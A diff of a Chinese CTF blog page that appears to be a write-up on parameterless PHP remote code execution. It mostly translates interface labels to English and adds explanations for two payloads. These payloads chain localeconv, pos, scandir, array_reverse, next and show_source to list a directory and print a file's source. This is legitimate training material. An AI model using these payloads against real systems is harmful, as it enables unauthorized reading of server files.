@@ -195,7 +195,7 @@
     
     
     <span class="dot"></span>
-    <span>479 字</span>
+    <span>522 words</span>
     
   </div>
   
@@ -239,9 +239,11 @@
 <p><strong>payload</strong></p>
 <pre class="highlight"><code class="hljs php">?exp=print_r(scandir(pos(localeconv())));<br></code></pre>
 
+<p><code>localeconv</code>第一个字符是<code>.</code> <code> pos</code>获取这个<code>.</code>,然后利用<code>scandir</code>读取当前目录</p>
 <p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202162121.png" alt="image-20210202162121374" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202162121.png" class="lozad post-image"></p>
 <pre class="highlight"><code class="hljs php">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre>
 
+<p>倒序数组，数组内置指针下移一位，高亮显示文件。</p>
 <p><img src="https://husins.oss-cn-beijing.aliyuncs.com/20210202162216.png" alt="image-20210202162216213" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://husins.oss-cn-beijing.aliyuncs.com/20210202162216.png" class="lozad post-image"></p>
 
   </div>
@@ -261,7 +263,7 @@
     <a href="/BJDCTF2020之Mark-loves-cat/" class="nav-link">
       <i class="iconfont icon-left nav-prev-icon"></i>
       <div>
-        <div class="nav-label">上一篇</div>
+        <div class="nav-label">Prev</div>
         
         <div class="nav-title">BJDCTF2020之Mark loves cat </div>
         
@@ -273,7 +275,7 @@
   <div class="nav-item-next">
     <a href="/GitHacker使用总结/" class="nav-link">
       <div>
-        <div class="nav-label">下一篇</div>
+        <div class="nav-label">Next</div>
         
         <div class="nav-title">GitHacker使用总结 </div>
         
@@ -285,7 +287,7 @@
 </div>
 
 <div class="card card-content toc-card" id="mobiletoc">
-  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
 
 </div></main>
           <aside class="left-column">
@@ -298,16 +300,16 @@
 <p class="author-description">层楼终究误少年,自由早晚乱余生。</p>
 <div class="author-message">
   <a class="author-posts-count" href="/archives">
-    <span>45</span>
-    <span>文章</span>
+    <span>46</span>
+    <span>Posts</span>
   </a>
   <a class="author-categories-count" href="/categories">
     <span>3</span>
-    <span>分类</span>
+    <span>Categories</span>
   </a>
   <a class="author-tags-count" href="/tags">
-    <span>8</span>
-    <span>标签</span>
+    <span>9</span>
+    <span>Tags</span>
   </a>
 </div>
 
@@ -318,7 +320,7 @@
   
   <article class="display-when-two-columns spacer">
     <div class="card card-content toc-card">
-      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
 
     </div>
   </article>
@@ -326,7 +328,7 @@
   
   <article class="card card-content categories-widget">
     <div class="categories-card">
-  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>分类</div>
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>Categories</div>
   <div class="categories-list">
     
       <a href="/categories/CTF题解">
@@ -339,7 +341,7 @@
       <a href="/categories/漏洞总结">
         <div class="categories-list-item">
           漏洞总结
-          <span class="categories-list-item-badge">4</span>
+          <span class="categories-list-item-badge">5</span>
         </div>
       </a>
     
@@ -356,12 +358,14 @@
   
   <article class="card card-content tags-widget">
     <div class="tags-card">
-  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>热门标签</div>
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>hot tags</div>
   <div class="tags-list">
     
     <a href="\tags\BUUCTF" title="BUUCTF"><div class="tags-list-item">BUUCTF</div></a>
     
     <a href="\tags\攻防世界" title="攻防世界"><div class="tags-list-item">攻防世界</div></a>
+    
+    <a href="\tags\RCE" title="RCE"><div class="tags-list-item">RCE</div></a>
     
     <a href="\tags\SQL" title="SQL"><div class="tags-list-item">SQL</div></a>
     
@@ -387,15 +391,20 @@
   
   
   <article class="card card-content toc-card">
-    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>目录</div>
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
 
   </article>
   
   
   <article class="card card-content">
     <div class="recent-posts-card">
-  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>最近文章</div>
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>Recent Posts</div>
   <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-02-02</div>
+        <a href="/浅析无参数RCE/"><div class="recent-posts-item-content">浅析无参数RCE</div></a>
+      </div>
     
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-02-02</div>
@@ -410,11 +419,6 @@
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-02-02</div>
         <a href="/GXYCTF2019-禁止套娃/"><div class="recent-posts-item-content">GXYCTF2019-禁止套娃</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-01-28</div>
-        <a href="/GitHacker使用总结/"><div class="recent-posts-item-content">GitHacker使用总结</div></a>
       </div>
     
   </div>
